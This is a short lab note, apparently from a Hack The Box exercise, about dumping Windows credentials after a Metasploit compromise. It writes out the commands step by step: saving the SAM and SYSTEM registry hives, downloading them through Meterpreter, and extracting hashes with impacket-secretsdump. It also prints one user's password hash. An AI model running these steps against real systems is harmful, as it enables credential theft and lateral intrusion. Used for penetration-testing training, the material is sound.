
The Metasploit Project is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute the exploit code. This exploit code can be custom-made by the user or taken from a database containing the latest already discovered and modularized exploits. The Metasploit Framework includes a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. At its core, the Metasploit Project is a collection of commonly used tools that provide a complete environment for penetration testing and exploit development.
================================================================
         Metasploit
================================================================

SCENARIO:
Target machine (Windows) compromised via Metasploit. Attempting to extract SAM/SYSTEM hashes for credential analysis.

ISSUE:
The user was attempting to run 'impacket-secretsdump' directly inside the 'meterpreter' console, resulting in "Unknown command" errors. Furthermore, the user was encountering pathing/dependency issues when running scripts from within the Metasploit console.

STEPS TAKEN:

1. SAVING REGISTRY HIVES (Inside Meterpreter shell):
   - Command: reg save HKLM\SAM c:\sam.save
   - Command: reg save HKLM\SYSTEM c:\system.save
   - Verification: Confirmed via 'ls c:\\' that both files were created.

2. EXFILTRATION (Inside Meterpreter):
   - Command: download c:\\sam.save /tmp/sam.save
   - Command: download c:\\system.save /tmp/system.save

3. HASH EXTRACTION (On Kali Terminal):
   - Context: Must be run on the host terminal, NOT the meterpreter or msfconsole.
   - Command: impacket-secretsdump -sam /tmp/sam.save -system /tmp/system.save LOCAL

4. RESULTS:
   - Successfully dumped SAM hashes.
   - Target user 'htb-student' hash identified:
     cf3a5525ee9414229e66279623ed5c58

----------------------------------------------------------------
SUMMARY OF KEY LEARNINGS:
- Meterpreter is for interaction with the target; Linux tools must run on the Kali host.
- When running scripts that fail due to missing dependencies in the metasploit directory, exit the 'msfconsole' entirely and run the command from the standard bash shell.
- Always verify file existence on the remote target before attempting downloads.
================================================================
